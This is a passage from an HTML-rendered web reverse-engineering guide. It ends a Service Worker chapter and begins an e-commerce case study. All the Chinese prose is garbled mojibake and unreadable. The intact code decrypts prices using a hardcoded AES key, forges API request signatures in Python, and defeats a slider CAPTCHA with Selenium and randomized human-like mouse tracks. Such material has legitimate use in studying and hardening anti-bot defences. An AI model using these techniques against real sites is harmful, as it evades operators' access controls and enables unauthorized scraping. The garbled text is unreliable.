        </li>
        <li>
          <p><strong>ç›‘æ§ç½‘ç»œæ‹¦æˆª</strong></p>

          <ul>
            <li>è¯†åˆ«è¢«æ‹¦æˆªçš„è¯·æ±‚</li>
            <li>åˆ†æè¯·æ±‚/å“åº”ä¿®æ”¹</li>
            <li>ç»•è¿‡ç¼“å­˜æœºåˆ¶</li>
          </ul>
        </li>
      </ol>

      <h3 id="å®‰å…¨è€ƒè™‘">å®‰å…¨è€ƒè™‘</h3>

      <p><strong>ä½œä¸ºå¼€å‘è€…</strong>:</p>

      <ol>
        <li><strong>ä¸è¦ç¼“å­˜æ•æ„Ÿæ•°æ®</strong>
          <ul>
            <li>é¿å…ç¼“å­˜åŒ…å« Token çš„ API å“åº”</li>
            <li>ä¸è¦ç¼“å­˜ç”¨æˆ·ä¸ªäººä¿¡æ¯</li>
          </ul>
        </li>
      </ol>

      <ol start="2">
        <li>
          <p><strong>å®æ–½ç¼“å­˜ç‰ˆæœ¬æ§åˆ¶</strong></p>

          <ul>
            <li>æ›´æ–°æ—¶æ¸…ç†æ—§ç¼“å­˜</li>
            <li>ä½¿ç”¨ç‰ˆæœ¬å·å‘½åç¼“å­˜</li>
          </ul>
        </li>
        <li>
          <p><strong>éªŒè¯ Service Worker æ¥æº</strong></p>

          <ul>
            <li>ä½¿ç”¨ HTTPS</li>
            <li>å®æ–½ CSP é™åˆ¶</li>
          </ul>
        </li>
      </ol>

      <p><strong>ä½œä¸ºç ”ç©¶è€…</strong>:</p>

      <ol>
        <li><strong>åˆæ³•æˆæƒ</strong>
          <ul>
            <li>ä»…åœ¨æˆæƒèŒƒå›´å†…åˆ†æ</li>
            <li>éµå®ˆè´Ÿè´£ä»»æŠ«éœ²åŸåˆ™</li>
          </ul>
        </li>
      </ol>

      <ol start="2">
        <li><strong>éšç§ä¿æŠ¤</strong>
          <ul>
            <li>ä¸è¦æ³„éœ²ç”¨æˆ·æ•°æ®</li>
            <li>æµ‹è¯•æ—¶ä½¿ç”¨æµ‹è¯•è´¦å·</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-service-worker-èƒ½è®¿é—®-cookie-å—">Q: Service Worker èƒ½è®¿é—® Cookie å—ï¼Ÿ</h3>

      <p><strong>A</strong>: Service Worker æ— æ³•ç›´æ¥è®¿é—® <code>document.cookie</code>ï¼Œä½†ï¼š</p>

      <ul>
        <li>Fetch è¯·æ±‚ä¼šè‡ªåŠ¨æºå¸¦ Cookie</li>
        <li>å¯ä»¥é€šè¿‡æ‹¦æˆªè¯·æ±‚è¯»å– <code>Cookie</code> å¤´</li>
        <li>å¯ä»¥è®¾ç½®å“åº”çš„ <code>Set-Cookie</code> å¤´ï¼ˆå—åŒæºç­–ç•¥é™åˆ¶ï¼‰</li>
      </ul>

      <h3 id="q-å¦‚ä½•è°ƒè¯•-service-worker">Q: å¦‚ä½•è°ƒè¯• Service Workerï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li><strong>Chrome DevTools</strong>:
          <ul>
            <li>Application â†’ Service Workers</li>
            <li>å¯ä»¥å¯åŠ¨/åœæ­¢ã€æ›´æ–°ã€æ³¨é”€</li>
            <li>å¯ä»¥åœ¨ Sources ä¸­è®¾ç½®æ–­ç‚¹</li>
          </ul>
        </li>
      </ol>

      <ol start="2">
        <li>
          <p><strong>Firefox DevTools</strong>:</p>

          <ul>
            <li>about:debugging â†’ This Firefox â†’ Service Workers</li>
            <li>å¯ä»¥å¯åŠ¨å’Œæ³¨é”€</li>
          </ul>
        </li>
        <li>
          <p><strong>ç¼–ç¨‹æ–¹å¼</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="nx">chrome</span><span class="o">:</span><span class="c1">//inspect/#service-workers  // Chrome</span>
<span class="nx">about</span><span class="o">:</span><span class="nx">debugging</span><span class="err">#</span><span class="o">/</span><span class="nx">runtime</span><span class="o">/</span><span class="k">this</span><span class="o">-</span><span class="nx">firefox</span><span class="w">  </span><span class="c1">// Firefox</span>
</code></pre>
          </div>
        </li>
      </ol>

      <h3 id="q-service-worker-èƒ½è¢«ç¦ç”¨å—">Q: Service Worker èƒ½è¢«ç¦ç”¨å—ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ul>
        <li>ç”¨æˆ·å¯ä»¥åœ¨æµè§ˆå™¨è®¾ç½®ä¸­ç¦ç”¨</li>
        <li>å¼€å‘è€…å¯ä»¥é€šè¿‡ <code>unregister()</code> æ³¨é”€</li>
        <li>æŸäº›æµè§ˆå™¨æ‰©å±•å¯ä»¥é˜»æ­¢ Service Worker</li>
      </ul>

      <h3 id="q-service-worker-çš„ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆ">Q: Service Worker çš„ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿ</h3>

      <p><strong>A</strong>:<br />
        Service Worker çš„ä½œç”¨åŸŸï¼ˆscopeï¼‰å†³å®šäº†å®ƒèƒ½æ§åˆ¶å“ªäº›é¡µé¢ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åªèƒ½æ§åˆ¶ /app/ ä¸‹çš„é¡µé¢</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s1">&#39;/sw.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">scope</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;/app/&#39;</span><span class="p">});</span>

<span class="c1">// é»˜è®¤ä½œç”¨åŸŸæ˜¯è„šæœ¬æ‰€åœ¨ç›®å½•</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s1">&#39;/scripts/sw.js&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// scope = &#39;/scripts/&#39;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <h3 id="å®˜æ–¹æ–‡æ¡£">å®˜æ–¹æ–‡æ¡£</h3>

      <ul>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">Service Worker API - MDN</a>
        </li>
        <li><a href="https://web.dev/progressive-web-apps/">PWA æ–‡æ¡£ - web.dev</a></li>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Cache">Cache API - MDN</a></li>
      </ul>

      <h3 id="å·¥å…·ä¸åº“">å·¥å…·ä¸åº“</h3>

      <ul>
        <li><a href="https://developers.google.com/web/tools/workbox">Workbox</a> - Google çš„ Service Worker åº“</li>
        <li><a href="https://github.com/GoogleChromeLabs/sw-toolbox">sw-toolbox</a> - Service Worker å·¥å…·ç®±</li>
        <li><a href="https://www.pwabuilder.com/">PWA Builder</a> - PWA ç”Ÿæˆå™¨</li>
      </ul>

      <h3 id="å®‰å…¨ç ”ç©¶">å®‰å…¨ç ”ç©¶</h3>

      <ul>
        <li><a href="https://w3c.github.io/ServiceWorker/#security-considerations">Service Worker Security</a></li>
        <li><a href="https://web.dev/pwa-security/">PWA Security Best Practices</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="../02-Techniques/browser_debugging.md">æµè§ˆå™¨è°ƒè¯•æŠ€å·§</a></li>
        <li><a href="../02-Techniques/offline_storage.md">ç¦»çº¿å­˜å‚¨åˆ†æ</a></li>
        <li><a href="#04-Advanced-Recipes-csp-bypass">CSP ç»•è¿‡æŠ€æœ¯</a></li>
        <li><a href="../02-Techniques/web_worker_analysis.md">Web Worker åˆ†æ</a></li>
      </ul>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part VI: Complete Menus</h1>

    <div class="section" id="05-Case-Studies-case-ecommerce">
      <h2>45. E-commerce</h2>
      <h1 id="ç”µå•†ç½‘ç«™é€†å‘æ¡ˆä¾‹">ç”µå•†ç½‘ç«™é€†å‘æ¡ˆä¾‹</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>ç”µå•†ç½‘ç«™é€šå¸¸å…·æœ‰å¤æ‚çš„åçˆ¬è™«æœºåˆ¶ï¼ŒåŒ…æ‹¬ API ç­¾åã€åŠ å¯†ä»·æ ¼ã€æ»‘å—éªŒè¯ç ç­‰ã€‚æœ¬æ–‡é€šè¿‡å®é™…æ¡ˆä¾‹ä»‹ç»ç”µå•†ç½‘ç«™çš„é€†å‘æ€è·¯ã€‚</p>

      <hr />

      <h2 id="æ¡ˆä¾‹ä¸€å•†å“ä»·æ ¼åŠ å¯†">æ¡ˆä¾‹ä¸€ï¼šå•†å“ä»·æ ¼åŠ å¯†</h2>

      <h3 id="èƒŒæ™¯">èƒŒæ™¯</h3>

      <p>æŸç”µå•†ç½‘ç«™çš„å•†å“åˆ—è¡¨é¡µï¼Œä»·æ ¼å­—æ®µè¿”å›çš„æ˜¯åŠ å¯†å­—ç¬¦ä¸²ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;product_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">12345</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;iPhone 15&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;price_enc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;U2FsdGVkX19Qx7...&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>æµè§ˆå™¨èƒ½æ­£å¸¸æ˜¾ç¤ºä»·æ ¼ï¼Œè¯´æ˜å‰ç«¯æœ‰è§£å¯†é€»è¾‘ã€‚</p>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-å®šä½è§£å¯†å‡½æ•°">1. å®šä½è§£å¯†å‡½æ•°</h4>

      <p><strong>æ–¹æ³•ä¸€ï¼šæœç´¢å…³é”®è¯</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Sources é¢æ¿æœç´¢</span>
<span class="s2">&quot;price_enc&quot;</span>
<span class="s2">&quot;decrypt&quot;</span>
<span class="s2">&quot;AES&quot;</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³•äºŒï¼šDOM æ–­ç‚¹</strong></p>

      <ol>
        <li>å³é”®ä»·æ ¼å…ƒç´  -> Inspect</li>
        <li>å³é”® DOM èŠ‚ç‚¹ -> Break on -> subtree modifications</li>
        <li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹ä¼šåœåœ¨ä¿®æ”¹ä»·æ ¼çš„ä»£ç å¤„</li>
      </ol>

      <h4 id="2-åˆ†æåŠ å¯†ç®—æ³•">2. åˆ†æåŠ å¯†ç®—æ³•</h4>

      <p>æ–­ç‚¹åœä¸‹åï¼Œè§‚å¯Ÿ Call Stackï¼š</p>

      <pre><code>updatePrice()
  |- decryptPrice(encryptedPrice)
       |- CryptoJS.AES.decrypt(enc, key, {iv: iv})
</code></pre>

      <p>å‘ç°ä½¿ç”¨äº† <strong>AES-CBC</strong> åŠ å¯†ï¼ŒKey å’Œ IV éƒ½åœ¨ JS ä¸­ç¡¬ç¼–ç ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">decryptPrice</span><span class="p">(</span><span class="nx">enc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">&quot;1234567890abcdef&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">&quot;abcdefghijklmnop&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">enc</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="p">,</span>
<span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span><span class="p">,</span>
<span class="w">        </span><span class="nx">padding</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span>
<span class="w">    </span><span class="p">});</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">decrypted</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°">3. Python å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">unpad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decrypt_price</span><span class="p">(</span><span class="n">price_enc</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890abcdef&#39;</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdefghijklmnop&#39;</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">price_enc</span><span class="p">)</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">price_enc</span> <span class="o">=</span> <span class="s2">&quot;U2FsdGVkX19Qx7...&quot;</span>
<span class="nb">print</span><span class="p">(</span><span class="n">decrypt_price</span><span class="p">(</span><span class="n">price_enc</span><span class="p">))</span>  <span class="c1"># &quot;ï¿¥5999&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹äºŒapi-ç­¾åé€†å‘">æ¡ˆä¾‹äºŒï¼šAPI ç­¾åé€†å‘</h2>

      <h3 id="èƒŒæ™¯-2">èƒŒæ™¯</h3>

      <p>å•†å“æœç´¢æ¥å£éœ€è¦ç­¾åå‚æ•°ï¼š</p>

      <pre><code>GET /api/search?q=iPhone&amp;page=1&amp;sign=abc123&amp;timestamp=1234567890
</code></pre>

      <p>ä¸å¸¦ <code>sign</code> æˆ–ç­¾åé”™è¯¯éƒ½ä¼šè¿”å› 403ã€‚</p>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤-2">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-å®šä½ç­¾åç”Ÿæˆ">1. å®šä½ç­¾åç”Ÿæˆ</h4>

      <p><strong>XHR æ–­ç‚¹</strong>:</p>

      <ol>
        <li>Sources -> XHR/fetch breakpoints</li>
        <li>è¾“å…¥ <code>/api/search</code></li>
        <li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹ä¼šåœ¨è¯·æ±‚å‘é€å‰åœä¸‹</li>
      </ol>

      <h4 id="2-åˆ†æç­¾åé€»è¾‘">2. åˆ†æç­¾åé€»è¾‘</h4>

      <p>åœ¨ Call Stack ä¸­è¿½è¸ªï¼Œå‘ç°ç­¾åç”Ÿæˆå‡½æ•°ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">generateSign</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 1. å‚æ•°æ’åº</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nx">sort</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// 2. æ‹¼æ¥å­—ç¬¦ä¸²</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">keys</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">k</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// 3. åŠ ç›</span>
<span class="w">    </span><span class="nx">str</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;&amp;key=my_secret_key_2023&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// 4. MD5</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>éªŒè¯</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">generateSign</span><span class="p">({</span><span class="nx">q</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;iPhone&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">page</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="mf">1234567890</span><span class="p">})</span>
<span class="c1">// &quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°-2">3. Python å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">):</span>
    <span class="c1"># å‚æ•°æ’åº</span>
    <span class="n">sorted_params</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>

    <span class="c1"># æ‹¼æ¥</span>
    <span class="n">param_str</span> <span class="o">=</span> <span class="s1">&#39;&amp;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">sorted_params</span><span class="p">])</span>

    <span class="c1"># åŠ ç›</span>
    <span class="n">sign_str</span> <span class="o">=</span> <span class="n">param_str</span> <span class="o">+</span> <span class="s1">&#39;&amp;key=my_secret_key_2023&#39;</span>

    <span class="c1"># MD5</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">sign_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="s1">&#39;iPhone&#39;</span><span class="p">,</span>
    <span class="s1">&#39;page&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
<span class="p">}</span>
<span class="n">params</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>

<span class="c1"># å‘é€è¯·æ±‚</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/api/search&#39;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹ä¸‰æ»‘å—éªŒè¯ç ">æ¡ˆä¾‹ä¸‰ï¼šæ»‘å—éªŒè¯ç </h2>

      <h3 id="èƒŒæ™¯-3">èƒŒæ™¯</h3>

      <p>ç™»å½•æ—¶å‡ºç°æ»‘å—éªŒè¯ç ï¼Œéœ€è¦æ‹–åŠ¨æ»‘å—åˆ°æŒ‡å®šä½ç½®ã€‚</p>

      <hr />

      <h3 id="é€†å‘æ€è·¯">é€†å‘æ€è·¯</h3>

      <h4 id="1-è½¨è¿¹ç”Ÿæˆ">1. è½¨è¿¹ç”Ÿæˆ</h4>

      <p>çœŸå®ç”¨æˆ·æ‹–åŠ¨æ»‘å—æ—¶ï¼Œè½¨è¿¹æ˜¯ä¸è§„åˆ™çš„ï¼ˆæœ‰åŠ é€Ÿã€å‡é€Ÿã€æŠ–åŠ¨ï¼‰ã€‚</p>

      <p><strong>ç®€å•çš„çº¿æ€§è½¨è¿¹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">generate_track</span><span class="p">(</span><span class="n">distance</span><span class="p">):</span>
    <span class="n">track</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">distance</span><span class="p">:</span>
        <span class="n">step</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">distance</span> <span class="o">-</span> <span class="n">current</span><span class="p">)</span>  <span class="c1"># æ¯æ¬¡ç§»åŠ¨ 5px</span>
        <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">step</span><span class="p">)</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="n">step</span>
    <span class="k">return</span> <span class="n">track</span>
</code></pre>
      </div>

      <p><strong>æ¨¡æ‹ŸçœŸå®è½¨è¿¹</strong> (æ›´é«˜çº§):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_realistic_track</span><span class="p">(</span><span class="n">distance</span><span class="p">):</span>
    <span class="n">track</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">mid</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">*</span> <span class="mf">0.8</span>  <span class="c1"># 80% å¤„å¼€å§‹å‡é€Ÿ</span>

    <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">distance</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">mid</span><span class="p">:</span>
            <span class="c1"># åŠ é€Ÿé˜¶æ®µ</span>
            <span class="n">step</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># å‡é€Ÿé˜¶æ®µ</span>
            <span class="n">step</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">current</span> <span class="o">+</span> <span class="n">step</span> <span class="o">&gt;</span> <span class="n">distance</span><span class="p">:</span>
            <span class="n">step</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">-</span> <span class="n">current</span>

        <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">step</span><span class="p">)</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="n">step</span>

        <span class="c1"># éšæœºæŠ–åŠ¨</span>
        <span class="k">if</span> <span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.2</span><span class="p">:</span>
            <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="o">-</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
            <span class="n">current</span> <span class="o">-=</span> <span class="n">track</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">track</span>
</code></pre>
      </div>

      <h4 id="2-selenium-æ¨¡æ‹Ÿ">2. Selenium æ¨¡æ‹Ÿ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.action_chains</span><span class="w"> </span><span class="kn">import</span> <span class="n">ActionChains</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.by</span><span class="w"> </span><span class="kn">import</span> <span class="n">By</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">)</span>

<span class="c1"># ç­‰å¾…æ»‘å—åŠ è½½</span>
<span class="n">slider</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;slider-button&#39;</span><span class="p">)</span>

<span class="c1"># ç”Ÿæˆè½¨è¿¹</span>
<span class="n">distance</span> <span class="o">=</span> <span class="mi">260</span>  <span class="c1"># éœ€è¦ç§»åŠ¨çš„è·ç¦»ï¼ˆåƒç´ ï¼‰</span>
<span class="n">track</span> <span class="o">=</span> <span class="n">generate_realistic_track</span><span class="p">(</span><span class="n">distance</span><span class="p">)</span>

<span class="c1"># æ‰§è¡Œæ‹–åŠ¨</span>
<span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">click_and_hold</span><span class="p">(</span><span class="n">slider</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
<span class="k">for</span> <span class="n">step</span> <span class="ow">in</span> <span class="n">track</span><span class="p">:</span>
    <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">move_by_offset</span><span class="p">(</span><span class="n">step</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.001</span><span class="p">,</span> <span class="mf">0.003</span><span class="p">))</span>  <span class="c1"># æ¨¡æ‹Ÿäººç±»å»¶è¿Ÿ</span>

<span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">release</span><span class="p">()</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

